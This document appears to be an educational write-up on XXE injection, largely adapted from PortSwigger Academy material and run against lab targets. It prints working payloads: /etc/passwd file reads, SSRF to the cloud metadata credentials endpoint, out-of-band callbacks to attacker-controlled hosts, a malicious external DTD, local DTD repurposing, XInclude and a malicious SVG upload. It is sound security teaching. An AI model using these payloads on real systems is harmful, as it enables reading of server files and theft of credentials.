<h1>Exploiting XML External Entity (XXE) Vulnerabilities - FOR EDUCATIONAL PURPOSES ONLY</h1>

<h2>How To Find And Test For XXE Vulnerabilities</h2>

The vast majority of XXE vulnerabilities can be found quickly and reliably using Burp Suite's web vulnerability scanner. Manually testing for XXE vulnerabilities generally involves:

<ul>
  <li>Testing for <b>file retrieval</b> by defining an external entity based on a well-known operating system file and using that entity in data that is returned in the application's response.</li>
  <li>Testing for <b>blind XXE vulnerabilities</b> by defining an external entity based on a URL to a system that you control, and monitoring for interactions with that system. Burp Collaborator is perfect for this purpose.</li>
  <li>Testing for vulnerable inclusion of user-supplied non-XML data within a server-side XML document by using an <b>XInclude</b> attack to try to retrieve a well-known operating system file.</li>
  <li>Testing for XXE in file upload mechanisms (attempting to upload a malicious svg, docx, xslx)</li>
</ul>

<h2>Exploiting XXE to retrieve files</h2>

To perform an XXE injection attack that retrieves an arbitrary file from the server's filesystem, you need to modify the submitted XML in two ways:

<ol>
  <li>Introduce (or edit) a DOCTYPE element that defines an external entity containing the path to the file.</li>
  <li>Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity</li>
</ol>

For example, a shopping application sends XML data to the server when checking the stock of grocery items.

```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

To exploit the XXE and retrieve the /etc/passwd file, we must modify the XML to this:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

This XXE payload defines an external entity &xxe; whose value is the contents of the /etc/passwd file and uses the entity within the productId value.
This causes the application's response to include the contents of the /etc/passwd file

<h3>Example(s) Of Using XXE To Retrieve Files</h3>

Scenario 1: Web Application sends XML data to server to check the stock of items sold on the website. 

<img width="1260" height="348" alt="xxe-injection-stock-checker-browser" src="https://github.com/user-attachments/assets/eeb0a51f-aab5-43f7-bbf0-a8d6394d3f02" />

Below is the POST request to the /product/stock endpoint that is sent when users check the stock of an item.

```
POST /product/stock HTTP/2
Host: 0a7c00e404952062de953eee0026007c.web-security-academy.net
Cookie: session=bs0zDqdFU7IOVKqN2SN4GTPnbFXteD87
Content-Type: application/xml
Content-Length: 107

<?xml version="1.0" encoding="UTF-8"?>
  <stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
  </stockCheck>
```

If there are no defenses in place, then sending the following request will make the server reply with the content of the /etc/passwd file.

```
POST /product/stock HTTP/2
Host: 0a7c00e404952062de953eee0026007c.web-security-academy.net
Cookie: session=bs0zDqdFU7IOVKqN2SN4GTPnbFXteD87
Content-Length: 189
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

<img width="1416" height="612" alt="xxe-injection-stock-checker-read-etc-passwd-file-burpsuite" src="https://github.com/user-attachments/assets/1b4b9db5-90d5-427f-952e-1b924c341479" />


<h2>Exploiting XXE For SSRF</h2>

Aside from retrieval of sensitive data, the other main impact of XXE attacks is that they can be used to perform server-side request forgery (SSRF). This is a potentially serious vulnerability in which the server-side application can be induced to make HTTP requests to any URL that the server can access.

To exploit an XXE vulnerability to perform an SSRF attack, you need to define an external XML entity using the URL that you want to target, and use the defined entity within a data value. If you can use the defined entity within a data value that is returned in the application's response, then you will be able to view the response from the URL within the application's response, and so gain two-way interaction with the back-end system. If not, then you will only be able to perform blind SSRF attacks (which can still have critical consequences).

In the following XXE example, the external entity will cause the server to make a back-end HTTP request to an internal system within the organization's infrastructure:

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

<h3>Examples Of Using XXE For SSRF</h3>

Scenario 1: Web Application sends XML data to server to check the stock of items sold on the website.

<img width="1543" height="258" alt="xxe-injection-stock-checker-browser-ssrf" src="https://github.com/user-attachments/assets/0a6b3d50-49c7-470e-8219-ebdd229a96ef" />


```
POST /product/stock HTTP/2
Host: 0a740027046c804482c9a66d00ba00b3.web-security-academy.net
Cookie: session=tNrXUoaiGqmdN2BOwoBRjRLVKUvhMgIF
User-Agent: Mozilla/5.0
Content-Type: application/xml
Content-Length: 242

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ssrf [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

<img width="1910" height="665" alt="xxe-ssrf-burpsuite" src="https://github.com/user-attachments/assets/157e98ad-6f4c-4253-968c-1028afd3371d" />


<h2>Blind XXE Injection</h2>

Blind XXE vulnerabilities arise where the application is vulnerable to XXE injection but does not return the values of any defined external entities within its responses. This means that direct retrieval of server-side files is not possible, and so blind XXE is generally harder to exploit than regular XXE vulnerabilities.

There are two broad ways in which you can find and exploit blind XXE vulnerabilities:

<ul>
  <li>You can trigger out-of-band network interactions, sometimes exfiltrating sensitive data within the interaction data.</li>
  <li>You can trigger XML parsing errors in such a way that the error messages contain sensitive data.</li>
</ul>


<h2>XML Parameter Entities</h2>

Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used. In this situation, you might be able to use XML parameter entities instead. XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD. For present purposes, you only need to know two things. First, the declaration of an XML parameter entity includes the percent character before the entity name:
<!ENTITY % myparameterentity "my parameter entity value" >

And second, parameter entities are referenced using the percent character instead of the usual ampersand:

```
%myparameterentity;
```

This means that you can test for blind XXE using out-of-band detection via XML parameter entities as follows:

```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

This XXE payload declares an XML parameter entity called xxe and then uses the entity within the DTD. This will cause a DNS lookup and HTTP request to the attacker's domain, verifying that the attack was successful.


<h3>Detecting Blind XXE With Out-Of-Band Interaction</h3>

You can often detect blind XXE using the same technique as for XXE SSRF attacks but triggering the out-of-band network interaction to a system that you control. For example, you would define an external entity as follows:

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

```
POST /check_stock HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: Mozilla/5.0
Content-Type: application/xml
Content-Length: 205

<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://webhook.site/REDACTED"> %xxe; ]>
    <stockRequest>
        <productId>A100</productId>
    </stockRequest>
```

After sending the above request, we see a request made to your webhook. See images below. The dates and times don't add up because of time-zones, but the DNS request made to my webhook.site address was infact a result of the blind-xxe payload.

<img width="1412" height="609" alt="blind-xxe-outbound-request-to-webhook" src="https://github.com/user-attachments/assets/f743d8a6-ec00-4180-923e-c9ee963f9f15" />

<img width="1549" height="650" alt="blind-xxe-outbound-request-to-webhook-2" src="https://github.com/user-attachments/assets/f973fe8f-b357-45ed-8e38-a6080cf0f2e4" />


<h2>Exploiting blind XXE to retrieve data via error messages</h2>

An alternative approach to exploiting blind XXE is to trigger an XML parsing error where the error message contains the sensitive data that you wish to retrieve. This will be effective if the application returns the resulting error message within its response.

You can trigger an XML parsing error message containing the contents of the /etc/passwd file using the following malicious dtd file. The attacker would have to host this malicious dtd file on a server they control.

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

The attacker would then need to make the following request to the vulnerable endpoint:

```
POST /product/stock HTTP/2
Host: 0aa900d303123a23dc14d6cd0004002a.web-security-academy.net
Cookie: session=1YamMORDcPDwmoYHUrOyvMmxqiDcNmFq
User-Agent: Mozilla/5.0
Content-Type: application/xml
Content-Length: 231

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"https://exploit-0a5e00d3033f3ae1dc86d551012d004a.exploit-server.net/exploit"> %xxe;]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

See images below to see this in the Portswigger lab.


<img width="1199" height="726" alt="blind-xxe-stored-payload-1" src="https://github.com/user-attachments/assets/72a8ae6b-3f6c-4834-9485-d528db327c85" />

<img width="1118" height="239" alt="blind-xxe-stored-payload-2" src="https://github.com/user-attachments/assets/4874794b-3113-4fa5-8be9-4fe4d718e243" />

<img width="1420" height="666" alt="blind-xxe-malicious-dtd-file-retrieval-in-error-message" src="https://github.com/user-attachments/assets/e4402378-5ab6-4f1e-9014-d6446501a5fa" />


<h2>Exploiting XXE to retrieve data by repurposing a local DTD</h2>

<mark>How can we exploit XXE vulnerabilities when out-of-band interactions are blocked and you can't load an external DTD from a remote server?</mark>

In this situation, it might still be possible to trigger error messages containing sensitive data, due to a loophole in the XML language specification. If a document's DTD uses a hybrid of internal and external DTD declarations, then the internal DTD can redefine entities that are declared in the external DTD. When this happens, the restriction on using an XML parameter entity within the definition of another parameter entity is relaxed.

This means that an attacker can employ the error-based XXE technique from within an internal DTD, provided the XML parameter entity that they use is redefining an entity that is declared within an external DTD. Of course, if out-of-band connections are blocked, then the external DTD cannot be loaded from a remote location. Instead, it needs to be an external DTD file that is local to the application server. Essentially, the attack involves invoking a DTD file that happens to exist on the local filesystem and repurposing it to redefine an existing entity in a way that triggers a parsing error containing sensitive data. This technique was pioneered by Arseniy Sharoglazov, and ranked #7 in our top 10 web hacking techniques of 2018.

Suppose there is a DTD file on the server filesystem at the location /usr/local/app/schema.dtd, and this DTD file defines an entity called <b>custom_entity</b>. An attacker can trigger an XML parsing error message containing the contents of the /etc/passwd file by submitting a hybrid DTD like the following:

```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

This DTD carries out the following steps:

<ul>
  <li>Defines an XML parameter entity called local_dtd, containing the contents of the external DTD file that exists on the server filesystem.</li>
  <li>Redefines the XML parameter entity called custom_entity, which is already defined in the external DTD file. The entity is redefined as containing the error-based XXE exploit that was already described, for triggering an error message containing the contents of the /etc/passwd file.</li>
  <li>Uses the local_dtd entity, so that the external DTD is interpreted, including the redefined value of the custom_entity entity. This results in the desired error message.</li>
</ul>

<h3>Locating an existing DTD file to repurpose</h3>

Since this XXE attack involves repurposing an existing DTD on the server filesystem, a key requirement is to locate a suitable file. This is actually quite straightforward. Because the application returns any error messages thrown by the XML parser, you can easily enumerate local DTD files just by attempting to load them from within the internal DTD.

For example, Linux systems using the GNOME desktop environment often have a DTD file at /usr/share/yelp/dtd/docbookx.dtd. You can test whether this file is present by submitting the following XXE payload, which will cause an error if the file is missing:

```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

See images below to see what happens when the dtd file you are looking for exists on the local file system, and when it does not exist.

<img width="1419" height="664" alt="xxe-check-for-presence-of-local-dtd-file-positive" src="https://github.com/user-attachments/assets/548a750a-5144-4f6c-8963-b8583e1b671a" />

<img width="1417" height="609" alt="xxe-check-for-presence-of-local-dtd-file-negative" src="https://github.com/user-attachments/assets/ef7d9c74-8f3d-40ca-8e2e-7403909de2e5" />

After you have tested a list of common DTD files to locate a file that is present, you then need to obtain a copy of the file and review it to find an entity that you can redefine. Since many common systems that include DTD files are open source, you can normally quickly obtain a copy of files through internet search. 

On our vulnerable lab environment, we know the /usr/share/yelp/dtd/docbookx.dtd file exists, so we can lookup the file online and look for entities we can redefine in the file. See some lines from the /usr/share/yelp/dtd/docbookx.dtd file in the image below. We see multiple entities we can redifine in the dtd file.

<img width="1094" height="696" alt="docbookx-dtd-image" src="https://github.com/user-attachments/assets/5b8de751-e7ae-4862-864c-4033fa2fdadd" />

Now we send the following request to the server and we get the contents of /etc/passwd in the error message response. Notice in the request that we redefined the <b>ISOamso</b> entity in the local dtd, but there's many others we could have chosen.

```
POST /product/stock HTTP/2
Host: 0aba00ab039f48228344a1bd005b0014.web-security-academy.net
Cookie: session=LgN30BEpcZ5MkklBT7EMbzuKongzIEGv
User-Agent: Mozilla/5.0
Content-Type: application/xml
Content-Length: 419

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```


<img width="1415" height="610" alt="blind-xxe-repurposing-local-dtd-to-read-sensitive-files-BURPSUITE" src="https://github.com/user-attachments/assets/7a432653-f6ad-49bd-863d-199556b92d1c" />


<h1>Finding hidden attack surface for XXE injection</h1>

Attack surface for XXE injection vulnerabilities is obvious in many cases, because the application's normal HTTP traffic includes requests that contain data in XML format. In other cases, the attack surface is less visible. However, if you look in the right places, you will find XXE attack surface in requests that do not contain any XML.

<h2>XXE attacks via modified content type</h2>

Most POST requests use a default content type that is generated by HTML forms, such as application/x-www-form-urlencoded. Some web sites expect to receive requests in this format but will tolerate other content types, including XML.

For example, if a normal request contains the following:

```
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

Then we can send the same request in XML format like this:

```
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```

If the application tolerates requests containing XML in the message body, and parses the body content as XML, then you can reach the hidden XXE attack surface simply by reformatting requests to use the XML format.

<h2>XInclude attacks</h2>

Some applications receive client-submitted data, embed it on the server-side into an XML document, and then parse the document. An example of this occurs when client-submitted data is placed into a back-end SOAP request, which is then processed by the backend SOAP service.

In this situation, you cannot carry out a classic XXE attack, because you don't control the entire XML document and so cannot define or modify a DOCTYPE element. However, you might be able to use XInclude instead. XInclude is a part of the XML specification that allows an XML document to be built from sub-documents. You can place an XInclude attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server-side XML document.

To perform an XInclude attack, you need to reference the XInclude namespace and provide the path to the file that you wish to include. For example:

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

External Addresses can also be reached like this:

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="https://google.com"/></foo>
```

See Images Below.

<img width="1415" height="610" alt="xxe-xinclude-attack-file-retrieval-burpsuite" src="https://github.com/user-attachments/assets/b777fda3-1f8c-4e3c-a6fe-4c6537c1614e" />

<img width="1407" height="609" alt="xxe-xinclude-attack-external-DNS-request-burpsuite" src="https://github.com/user-attachments/assets/101c40a5-eacf-45ab-ba25-dd959c7f39cb" />

<h2>Exploiting XXE via image file upload</h2>

Some applications allow users to upload files which are then processed server-side. Some common file formats use XML or contain XML subcomponents. Examples of XML-based formats are office document formats like DOCX and image formats like SVG.

For example, an application might allow users to upload images, and process or validate these on the server after they are uploaded. Even if the application expects to receive a format like PNG or JPEG, the image processing library that is being used might support SVG images. Since the SVG format uses XML, an attacker can submit a malicious SVG image and so reach hidden attack surface for XXE vulnerabilities.

<h3>XXE File Upload Example</h3>

Uploading a malicious svg file (malicious.svg) as an image on a social media blog in order to view the target server's /etc/passwd file
```
POST /post/comment HTTP/2
Host: 0aa400e9046430888178390b00c200f8.web-security-academy.net
Cookie: session=wzfMr3MqUBsHnUUHJnjNbnFQ5oD92JPV
User-Agent: Mozilla/5.0
Content-Type: multipart/form-data; boundary=---------------------------42643693939776623073460195892
Content-Length: 1230

-----------------------------42643693939776623073460195892
Content-Disposition: form-data; name="csrf"

yTiWgLKXPf2FBdJxyQ45a2khgdh7EOKw
-----------------------------42643693939776623073460195892
Content-Disposition: form-data; name="postId"

2
-----------------------------42643693939776623073460195892
Content-Disposition: form-data; name="comment"

test
-----------------------------42643693939776623073460195892
Content-Disposition: form-data; name="name"

test
-----------------------------42643693939776623073460195892
Content-Disposition: form-data; name="avatar"; filename="malicious.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>

-----------------------------42643693939776623073460195892
Content-Disposition: form-data; name="email"

a@b.c
-----------------------------42643693939776623073460195892
Content-Disposition: form-data; name="website"

http://
-----------------------------42643693939776623073460195892--
```

After sending the above request, the server should include /etc/passwd in the image that the attacker attached to their comment on the blog. See Images Below

<img width="1415" height="604" alt="xxe-file-upload-malicious-svg-burpsuite" src="https://github.com/user-attachments/assets/1d190941-4bf1-48cc-9ecd-9d13f0949db5" />

<img width="1247" height="672" alt="xxe-file-upload-malicious-svg-browser" src="https://github.com/user-attachments/assets/ed3d5561-8bb0-46d1-8ca9-c536af960c06" />


